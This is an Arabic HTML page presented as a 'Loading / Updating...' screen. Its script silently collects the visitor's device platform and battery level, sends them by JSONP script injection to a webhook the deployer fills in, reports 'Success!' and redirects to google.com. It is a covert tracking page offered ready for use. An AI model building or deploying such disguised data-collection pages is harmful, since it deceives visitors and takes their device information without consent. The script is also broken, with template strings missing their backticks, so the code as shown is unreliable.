<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Loading</title>
</head>
<body style="display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
    <!-- هذا هو المربع الذي تراه -->
    <div id="box" style="background:white; padding:2rem; border-radius:10px; box-shadow:0 4px 10px rgba(0,0,0,0.1); text-align:center;">
        <h2 id="status">جاري التحديث...</h2>
    </div>

<script>
    // ⚙️ ضع رابط الويب هوك هنا (تأكد من عدم وجود مسافات)
    const WEBHOOK = '.......'; 

    async function run() {
        try {
            let battery = "N/A";
            if(navigator.getBattery) {
                let b = await navigator.getBattery();
                battery = Math.round(b.level * 100) + "%";
            }

            let msg = 🎉 تقرير جديد\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${battery};

            // استخدام JSONP لتجاوز مشاكل الشبكة
            const script = document.createElement('script');
            script.src = ${WEBHOOK}?callback=handleResponse&payload=${encodeURIComponent(JSON.stringify({content: msg}))};
            
            window.handleResponse = function(data) {
                document.getElementById('status').innerText = "تم بنجاح!";
                setTimeout(() => window.location.href = 'https://google.com', 1000);
            };

            document.body.appendChild(script);
        } catch (e) {
            document.getElementById('status').innerText = "خطأ: " + e.message;
        }
    }

    run();
</script>
</body>
</html>
